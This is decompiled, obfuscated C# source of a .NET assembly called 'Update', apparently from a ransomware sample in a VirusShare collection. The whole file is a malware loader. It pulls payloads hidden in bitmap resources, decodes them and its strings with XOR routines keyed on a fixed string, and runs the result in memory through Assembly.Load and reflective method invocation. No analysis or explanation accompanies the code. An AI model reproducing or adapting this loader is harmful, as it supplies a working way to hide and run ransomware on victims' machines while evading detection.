// Decompiled with JetBrains decompiler
// Type: IþRó7CYC5mIÙiÖ
// Assembly: Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 33A3B3AC-4F35-44F3-B210-BC232721A713
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-27cf1562007d170b67ee3bcd5944feca9934cefe9480d67af08f20a2b4cffbb3.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

public class IþRó7CYC5mIÙiÖ
{
  private static string KXíX9DÅBTGòJNjùDLç = "ohRQAþú1B6û7upwZ1óFó4reÔDeuê4õ";
  private static ResourceManager AÃoÀÌôriÚóþ = new ResourceManager("XEkv9xJVUiwDuMIT", Assembly.GetExecutingAssembly());

  private static byte[] ODèccöýPhÌÂ7ØKÈ => IþRó7CYC5mIÙiÖ.ìQ5ÙxîÃíeN4Ìymß(IþRó7CYC5mIÙiÖ.ëôÓïÅnnRÒûÌÏu2êH5((Bitmap) IþRó7CYC5mIÙiÖ.AÃoÀÌôriÚóþ.GetObject("JgfRiGbZuwcUUw"), IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç));

  private static byte[] XíCiKïòúJÞi => IþRó7CYC5mIÙiÖ.ìQ5ÙxîÃíeN4Ìymß(IþRó7CYC5mIÙiÖ.ëôÓïÅnnRÒûÌÏu2êH5((Bitmap) IþRó7CYC5mIÙiÖ.AÃoÀÌôriÚóþ.GetObject("gbHn4iEQKTq65"), IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç));

  [STAThread]
  public static void Main()
  {
    object[] objArray = new object[7]
    {
      (object) IþRó7CYC5mIÙiÖ.ODèccöýPhÌÂ7ØKÈ,
      (object) IþRó7CYC5mIÙiÖ.Ê6KêDaÉskRybUJ("5A0A160ECEB4010B0FB019100812"),
      (object) false,
      (object) false,
      (object) false,
      (object) false,
      (object) IþRó7CYC5mIÙiÖ.Ê6KêDaÉskRybUJ("3F3B3F129B99")
    };
    byte[] xíCiKïòúJþi = IþRó7CYC5mIÙiÖ.XíCiKïòúJÞi;
    ref byte[] local1 = ref xíCiKïòúJþi;
    string str = IþRó7CYC5mIÙiÖ.Ê6KêDaÉskRybUJ("213C3B249D8E");
    ref string local2 = ref str;
    ref object[] local3 = ref objArray;
    IþRó7CYC5mIÙiÖ.PáÝIKòñVOpOLÇóP(ref local1, ref local2, ref local3);
  }

  public static void PáÝIKòñVOpOLÇóP(
    ref byte[] øþTÉTËTáBZÈeìýÐAiýÆ,
    ref string qDÆýzÔ6ÁÁô,
    ref object[] ðhëËmûsEFÕmû)
  {
    object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(øþTÉTËTáBZÈeìýÐAiýÆ).CreateInstance(IþRó7CYC5mIÙiÖ.Ê6KêDaÉskRybUJ("3A273F11BB")));
    objectValue.GetType().InvokeMember(qDÆýzÔ6ÁÁô, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(objectValue), ðhëËmûsEFÕmû);
  }

  public static string Ê6KêDaÉskRybUJ(string söîëÈVkjÌïê)
  {
    long num1 = (long) Math.Round((double) Strings.Len(söîëÈVkjÌïê) / 2.0);
    string str;
    for (long index = 1; index <= num1; ++index)
    {
      int num2 = (int) Math.Round(Conversion.Val("&H" + Strings.Mid(söîëÈVkjÌïê, (int) (2L * index - 1L), 2)));
      int num3 = Strings.AscW(Strings.Mid(IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç, (int) (index % (long) Strings.Len(IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç) + 1L), 1));
      str += Conversions.ToString(Strings.ChrW(num2 ^ num3));
    }
    return str;
  }

  public static byte[] ìQ5ÙxîÃíeN4Ìymß(byte[] L2413JörìP1WVB)
  {
    byte[] bytes = Encoding.Unicode.GetBytes(IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç);
    byte[] array1 = new byte[0];
    Array.Resize<byte>(ref array1, bytes.Length);
    int index1 = 0;
    int num1 = L2413JörìP1WVB.Length - 1 - (array1.Length - 1);
    int num2 = L2413JörìP1WVB.Length - 1;
    for (int index2 = num1; index2 <= num2; ++index2)
    {
      array1[index1] = L2413JörìP1WVB[index2];
      ++index1;
    }
    byte[] array2 = L2413JörìP1WVB;
    Array.Resize<byte>(ref array2, L2413JörìP1WVB.Length - array1.Length);
    int index3 = 0;
    int num3 = array2.Length - 1;
    for (int index4 = 0; index4 <= num3; ++index4)
    {
      array2[index4] = (byte) ((int) L2413JörìP1WVB[index4] ^ (int) array1[index3] ^ (int) bytes[index3]);
      if (index3 == bytes.Length - 1)
        index3 = 0;
      else
        ++index3;
    }
    return array2;
  }

  public static byte[] ëôÓïÅnnRÒûÌÏu2êH5(Bitmap ÏîQdááæjÊZúJÛ, string Ìõ6ëmqMiÕÏiÙdÕêrïù)
  {
    byte[] array;
    try
    {
      string str = Ìõ6ëmqMiÕÏiÙdÕêrïù;
      int index1 = 0;
      int num1;
      for (int length = str.Length; index1 < length; ++index1)
      {
        char ch = str[index1];
        num1 += (int) ch;
      }
      int num2 = ÏîQdááæjÊZúJÛ.Width * ÏîQdááæjÊZúJÛ.Height;
      for (int x = ÏîQdááæjÊZúJÛ.Width - 1; x != 0; --x)
      {
        Color color = ÏîQdááæjÊZúJÛ.GetPixel(x, ÏîQdááæjÊZúJÛ.Height - 1);
        int num3 = 0;
        int num4 = (int) color.R % (int) byte.MaxValue;
        int num5 = (int) color.B - (num4 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
        if ((num4 + (int) byte.MaxValue * num5 ^ num1) == 47)
          --num2;
        color = new Color();
        num3 = 0;
      }
      array = new byte[num2 + 1];
      int index2 = 0;
      for (int x = 0; x != ÏîQdááæjÊZúJÛ.Width; ++x)
      {
        int y = 0;
        while (y != ÏîQdááæjÊZúJÛ.Height)
        {
          Color color = ÏîQdááæjÊZúJÛ.GetPixel(x, y);
          int num6 = 0;
          int num7 = (int) color.R % (int) byte.MaxValue;
          int num8 = (int) color.B - (num7 % (int) byte.MaxValue + (int) color.G) % (int) byte.MaxValue / 3;
          int num9 = num7 + (int) byte.MaxValue * num8 ^ num1;
          if (num9 != 47)
            array[index2] = (byte) (num9 - (int) byte.MaxValue);
          color = new Color();
          num6 = 0;
          ++y;
          ++index2;
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (false)
      {
        int num = (int) MessageBox.Show(exception.Message);
      }
      ProjectData.ClearProjectError();
    }
    for (int newSize = array.Length - (Encoding.Unicode.GetByteCount(IþRó7CYC5mIÙiÖ.KXíX9DÅBTGòJNjùDLç.ToCharArray()) - 1); newSize != array.Length; ++newSize)
    {
      if (array[newSize] == (byte) 0)
      {
        Array.Resize<byte>(ref array, newSize);
        break;
      }
    }
    return array;
  }
}
